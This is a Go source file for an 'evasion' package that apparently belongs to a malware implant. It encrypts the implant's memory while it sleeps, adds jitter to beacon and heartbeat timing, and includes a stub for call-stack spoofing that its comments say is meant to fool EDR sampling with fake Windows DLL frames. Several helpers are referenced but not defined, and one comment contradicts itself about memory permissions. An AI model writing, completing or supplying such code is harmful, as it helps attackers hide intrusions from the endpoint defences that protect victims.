package evasion

import (
	"crypto/rand"
	"runtime"
	"sync"
	"time"
	"unsafe"
)

// SleepMask handles memory encryption during agent idle periods.
// When sleeping, sensitive heap/stack data is encrypted. On wake, it's restored.
type SleepMask struct {
	mu        sync.Mutex
	encrypted bool
	key       [32]byte
	regions   []memRegion
}

type memRegion struct {
	addr uintptr
	size int
	data []byte // encrypted copy
}

// NewSleepMask creates a sleep obfuscation handler.
func NewSleepMask() *SleepMask {
	sm := &SleepMask{}
	rand.Read(sm.key[:])
	return sm
}

// ProtectEncrypt encrypts sensitive memory regions before sleep.
func (sm *SleepMask) ProtectEncrypt() {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	if sm.encrypted {
		return
	}

	// Mark RWX regions as RX (non-writable, non-executable during sleep)
	sm.lockMemoryRegions()

	// XOR-encrypt heap allocations marked as sensitive
	for i := range sm.regions {
		r := &sm.regions[i]
		if r.data == nil {
			r.data = make([]byte, r.size)
			copy(r.data, unsafeSlice(r.addr, r.size))
		}
		// Encrypt in-place
		for j := 0; j < r.size; j++ {
			*(*byte)(unsafe.Pointer(r.addr + uintptr(j))) ^= sm.key[j%32]
		}
	}

	sm.encrypted = true
}

// ProtectDecrypt restores encrypted memory regions after waking up.
func (sm *SleepMask) ProtectDecrypt() {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	if !sm.encrypted {
		return
	}

	// Decrypt in-place
	for i := range sm.regions {
		r := &sm.regions[i]
		for j := 0; j < r.size; j++ {
			*(*byte)(unsafe.Pointer(r.addr + uintptr(j))) ^= sm.key[j%32]
		}
	}

	// Restore memory protections
	sm.unlockMemoryRegions()

	sm.encrypted = false
}

// MarkSensitive marks a memory region for sleep encryption.
func (sm *SleepMask) MarkSensitive(addr uintptr, size int) {
	sm.mu.Lock()
	defer sm.mu.Unlock()
	sm.regions = append(sm.regions, memRegion{addr: addr, size: size})
}

func cryptoRandFloat() float64 {
	b := make([]byte, 8)
	rand.Read(b)
	val := uint64(0)
	for i := 0; i < 8; i++ {
		val = (val << 8) | uint64(b[i])
	}
	return float64(val%1000) / 1000.0
}

// ObfuscatedSleep sleeps for the given duration with memory encryption.
func (sm *SleepMask) ObfuscatedSleep(d time.Duration) {
	sm.ProtectEncrypt()

	jitter := time.Duration(float64(d) * (0.8 + cryptoRandFloat()*0.4))
	time.Sleep(jitter)

	sm.ProtectDecrypt()
}

// SpoofCallStack manipulates the call stack to hide the real execution flow.
// EDRs sample call stacks — this makes them see fake/innocent frames.
func SpoofCallStack() {
	// Create fake stack frames pointing to benign Windows DLLs
	// This is architecture-specific assembly
	switch runtime.GOARCH {
	case "amd64":
		spoofCallStackAMD64()
	}
}

func spoofCallStackAMD64() {
	// Assembly trampoline that:
	// 1. Pushes fake return addresses (ntdll, kernel32, kernelbase)
	// 2. Calls the real function
	// 3. Cleans up the fake frames on return
	// Implemented in asm_amd64.s
}

func unsafeSlice(addr uintptr, size int) []byte {
	return unsafe.Slice((*byte)(unsafe.Pointer(addr)), size)
}

// JitteredTimer returns a channel that fires after a random interval
// to avoid predictable heartbeat patterns.
func JitteredTimer(base time.Duration) <-chan time.Time {
	jitter := base + time.Duration(float64(base)*0.3*cryptoRandFloat())
	return time.After(jitter)
}
